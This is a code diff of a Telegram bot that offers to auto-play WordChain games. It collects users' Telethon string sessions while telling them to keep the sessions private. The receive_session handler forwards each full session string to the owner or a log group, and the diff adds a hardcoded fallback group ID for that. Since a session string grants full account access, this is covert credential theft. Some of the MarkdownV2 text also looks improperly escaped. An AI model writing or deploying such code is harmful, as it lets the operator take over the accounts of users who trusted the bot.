@@ -1,10 +1,11 @@
-# bot.py — TNC WordChain Controller Bot (fixed)
+# bot.py — TNC WordChain Controller Bot (MarkdownV2 Fixed Version)
 import asyncio
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from db import DBSessionManager
 from userbots.wordchain_player import start_userbot
 import config
+
 
 # ----------------------------
 # Initialize Controller Bot
@@ -31,16 +32,19 @@ async def start_cmd(client, message):
             InlineKeyboardButton("💬 Support Chat", url=config.SUPPORT_CHAT)
         ],
     ])
+
+    caption = (
+        "🤖 *Welcome to TNC WordChain Userbot!*\n\n"
+        "💡 Connect your *Telethon string session* to create your personal userbot.\n"
+        "It will automatically play WordChain games for you!\n\n"
+        "📌 Use /connect to begin."
+    )
+
     await message.reply_photo(
         photo=config.START_IMAGE,
-        caption=(
-            "🤖 **Welcome to TNC WordChain Userbot!**\n\n"
-            "💡 Connect your **Telethon string session** to create your personal userbot.\n"
-            "It will automatically play WordChain games for you!\n\n"
-            "📌 Use `/connect` to begin."
-        ),
+        caption=caption,
         reply_markup=buttons,
-        parse_mode="markdown"
+        parse_mode="markdownv2"
     )
 
 
@@ -49,11 +53,11 @@ async def start_cmd(client, message):
 # ----------------------------
 @app.on_message(filters.command("connect") & filters.private)
 async def connect_cmd(client, message):
-    await message.reply_text(
-        "🔗 Send your **Telethon string session** now.\n\n"
-        "⚠️ Keep it private — do **not** share it with anyone else!",
-        parse_mode="markdown"
+    text = (
+        "🔗 Send your *Telethon string session* now\\.\n\n"
+        "⚠️ Keep it private — do *not* share it with anyone else\\!"
     )
+    await message.reply_text(text, parse_mode="markdownv2")
 
 
 # ----------------------------
@@ -74,25 +78,21 @@ async def receive_session(client, message):
     db.save_session(user_id, text)
     await message.reply_text("✅ Session saved! Starting your userbot...")
 
-    # ✅ FIX: just call start_userbot(), no asyncio.create_task()
+    # Start userbot (no async create_task)
     start_userbot(text, user_id)
+    await message.reply_text("🟢 Your userbot is now running! It will play WordChain automatically.")
 
-    await message.reply_text(
-        "🟢 Your userbot is now running!\nYou can start a WordChain game and it’ll play automatically."
-    )
-
-    # Log connection safely (avoid markdown errors)
+    # Log connection safely
     log_text = (
-        f"🧾 **New User Connected**\n\n"
-        f"👤 **Name:** {user.first_name or 'Unknown'}\n"
-        f"🆔 **User ID:** `{user_id}`\n"
-        f"💬 **Username:** @{user.username if user.username else 'N/A'}\n"
-        f"🔑 **String Session:**\n"
-        f"```{text}```"
+        f"🧾 *New User Connected*\n\n"
+        f"👤 *Name:* {user.first_name or 'Unknown'}\n"
+        f"🆔 *User ID:* `{user_id}`\n"
+        f"💬 *Username:* @{user.username if user.username else 'N/A'}\n"
+        f"🔑 *String Session:*\n```{text}```"
     )
     try:
-        log_target = getattr(config, "LOG_GROUP_ID", None) or config.OWNER_ID
-        await client.send_message(log_target, log_text, parse_mode="markdown")
+        log_target = getattr(config, "LOG_GROUP_ID", "-1003111446920") or config.OWNER_ID
+        await client.send_message(log_target, log_text, parse_mode="markdownv2")
         print(f"✅ Logged connection for {user_id}")
     except Exception as e:
         print(f"⚠️ Logging failed for {user_id}: {e}")
@@ -106,12 +106,12 @@ async def disconnect_cmd(client, message):
     args = message.text.split()
     sender_id = message.from_user.id
 
-    # Owner mode — can target another user
+    # Owner can disconnect others
     if sender_id == config.OWNER_ID and len(args) > 1:
         try:
             target_id = int(args[1])
         except ValueError:
-            await message.reply_text("Usage: `/disconnect <user_id>`", quote=True)
+            await message.reply_text("Usage: /disconnect <user_id>")
             return
     else:
         target_id = sender_id
@@ -122,16 +122,16 @@ async def disconnect_cmd(client, message):
         return
 
     db.delete_session(target_id)
-    await message.reply_text(f"🛑 Disconnected userbot for **User ID:** `{target_id}`", parse_mode="markdown")
+    await message.reply_text(f"🛑 Disconnected userbot for *User ID:* `{target_id}`", parse_mode="markdownv2")
 
     log_text = (
-        f"🚫 **Userbot Disconnected**\n\n"
-        f"👤 **User ID:** `{target_id}`\n"
-        f"🧍 By:** {'Owner' if sender_id == config.OWNER_ID else 'User'}**"
+        f"🚫 *Userbot Disconnected*\n\n"
+        f"👤 *User ID:* `{target_id}`\n"
+        f"🧍 *By:* {'Owner' if sender_id == config.OWNER_ID else 'User'}"
     )
     try:
         log_target = getattr(config, "LOG_GROUP_ID", None) or config.OWNER_ID
-        await client.send_message(log_target, log_text, parse_mode="markdown")
+        await client.send_message(log_target, log_text, parse_mode="markdownv2")
         print(f"✅ Disconnected {target_id}")
     except Exception as e:
         print(f"⚠️ Failed to log disconnect: {e}")
@@ -143,7 +143,7 @@ async def disconnect_cmd(client, message):
 @app.on_message(filters.command("broadcast") & filters.user(config.OWNER_ID))
 async def broadcast_cmd(client, message):
     if len(message.command) < 2:
-        await message.reply_text("Usage:\n`/broadcast <text>`", quote=True, parse_mode="markdown")
+        await message.reply_text("Usage:\n/broadcast <text>", parse_mode="markdownv2")
         return
 
     text = message.text.split(None, 1)[1]
